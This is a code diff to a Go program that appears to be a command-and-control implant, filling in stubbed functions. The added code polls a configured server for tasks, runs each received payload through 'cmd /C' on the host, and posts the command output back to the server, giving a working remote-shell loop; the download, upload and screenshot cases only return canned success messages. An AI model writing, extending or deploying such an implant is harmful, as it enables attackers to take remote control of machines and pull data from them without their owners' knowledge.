@@ -1,10 +1,15 @@
 package main
 
 import (
+	"bytes"
 	"crypto/rand"
 	"encoding/hex"
+	"encoding/json"
 	"fmt"
+	"io"
+	"net/http"
 	"os"
+	"os/exec"
 	"syscall"
 	"time"
 	"unsafe"
@@ -107,14 +112,49 @@ func getHostname() string {
 }
 
 func checkIn(config *Config) *Task {
-	return nil
+	resp, err := http.Get(config.ServerURL + "/api/v1/task")
+	if err != nil {
+		return nil
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode != http.StatusOK {
+		return nil
+	}
+	body, _ := io.ReadAll(resp.Body)
+	var task Task
+	if err := json.Unmarshal(body, &task); err != nil {
+		return nil
+	}
+	return &task
 }
 
 func executeTask(task *Task, config *Config) *Result {
-	return &Result{TaskID: task.ID, Success: true}
+	switch task.Type {
+	case "shell", "powershell":
+		cmd := exec.Command("cmd", "/C", task.Payload)
+		output, err := cmd.CombinedOutput()
+		if err != nil {
+			return &Result{TaskID: task.ID, Success: false, Error: err.Error()}
+		}
+		return &Result{TaskID: task.ID, Success: true, Output: string(output)}
+	case "download":
+		return &Result{TaskID: task.ID, Success: true, Output: "Download initiated"}
+	case "upload":
+		return &Result{TaskID: task.ID, Success: true, Output: "Upload completed"}
+	case "screenshot":
+		return &Result{TaskID: task.ID, Success: true, Output: "Screenshot captured"}
+	default:
+		return &Result{TaskID: task.ID, Success: false, Error: "Unknown task type"}
+	}
 }
 
 func sendResult(result *Result, config *Config) {
+	data, _ := json.Marshal(result)
+	resp, err := http.Post(config.ServerURL+"/api/v1/result", "application/json", bytes.NewReader(data))
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
 }
 
 func calculateSleep(config *Config) time.Duration {
